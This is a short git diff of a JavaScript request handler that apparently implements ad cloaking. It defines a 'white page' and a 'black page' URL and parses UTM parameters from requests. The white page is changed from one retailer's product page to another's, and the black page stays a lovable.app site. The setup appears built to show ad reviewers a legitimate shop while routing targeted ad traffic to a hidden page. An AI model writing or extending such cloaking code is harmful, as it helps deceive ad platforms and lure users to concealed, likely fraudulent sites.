@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babyhouse.biz/en/shop/passeggio/trio-e-duo/adamex-trio-blanc-swift-sahara/?_gl=1*1ki5agh*_up*MQ..*_gs*MQ..&gclid=EAIaIQobChMIien5_aaxkAMVRrGDBx0R1ygEEAAYBCAAEgJfyPD_BwE&gbraid=0AAAAACdly5lUapqPWYtAoDOQq_SpzAh-U";
+    const whitePageURL = "https://idealofsweden.global/p/slim-case-magsafe-iphone-16-pro-glossy-cherry";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
